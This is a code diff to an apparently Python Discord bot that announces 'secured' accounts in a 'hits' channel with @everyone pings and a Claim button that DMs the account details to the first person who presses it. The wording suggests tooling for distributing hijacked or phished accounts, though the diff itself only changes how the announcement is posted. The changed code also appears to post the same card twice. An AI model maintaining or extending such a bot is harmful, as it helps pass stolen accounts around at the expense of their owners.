@@ -460,14 +460,19 @@ async def publish_embed_secure_result(
         # embed — the details are DM'd to whoever presses Claim.
         await _post_hit(
             hits_channel,
-            content="@everyone **An account has been secured - press Claim to claim it!**",
+            content="@everyone",
             allowed_mentions=AllowedMentions(everyone=True, roles=False, users=False),
+        )
+        await _post_hit(
+            hits_channel,
+            view=public_card,
+            allowed_mentions=AllowedMentions(everyone=False, roles=False, users=False),
         )
         await _post_hit(hits_channel, view=public_card)
     else:
         await _post_hit(
             hits_channel,
-            content="@everyone **Successfully secured an account**",
+            content="@everyone",
             allowed_mentions=AllowedMentions(everyone=True, roles=False, users=False),
         )
         if stats_embed is not None:
